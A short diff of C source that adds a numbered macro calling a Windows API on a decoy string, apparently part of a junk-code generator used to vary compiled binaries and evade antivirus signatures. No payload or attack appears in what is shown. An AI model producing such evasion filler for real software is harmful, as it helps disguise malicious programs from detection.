@@ -66,6 +66,7 @@ LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry;
 SECURITY_DESCRIPTOR psd;
 __int64 qwFileSize,myFilesize,qwFileOffset,qwmyFileOffset;
 PBYTE pbFile,pbmyFile;
+FARPROC pFunc;
 HKEY hKey;
 char AddMsg[]="President Obama's page on Google's social network site has been inundated with messages in Chinese after restrictions in China were removed.";
 OSVERSIONINFOEX osvi;
@@ -193,6 +194,7 @@ SYSTEM_PERFORMANCE_INFORMATION SysPerfInfo;
 SYSTEM_TIME_INFORMATION        SysTimeInfo;
 SYSTEM_BASIC_INFORMATION       SysBaseInfo;
 typedef LONG (WINAPI *PROCNTQSI)(UINT,PVOID,ULONG,PULONG);
+typedef BOOL (WINAPI *CHECKD8)(LPCTSTR,LPSTR,DWORD,PBOOL,PBOOL);
 PROCNTQSI NtQuerySystemInformation;
 typedef BOOL (CALLBACK *PROCENUMPROC)(DWORD, WORD, LPSTR, LPARAM);
 typedef struct {
@@ -2311,6 +2313,16 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 	}\
 	catch(...) {\
 	Sleep(166);\
+	}
+
+#define XCODE167 try {OUTSTR("167");\
+	pFunc=GetProcAddress(LoadLibrary("kernel32.dll"),"CheckNameLegalDOS8Dot3");\
+	if(pFunc) {\
+		bRetval=((CHECKD8)pFunc)(AddMsg,szXBuff,dwRes,&bVal,&bRetval);\
+	}\
+	}\
+	catch(...) {\
+	Sleep(167);\
 	}
 #ifdef FLOWERX
 #include "xrand.h"
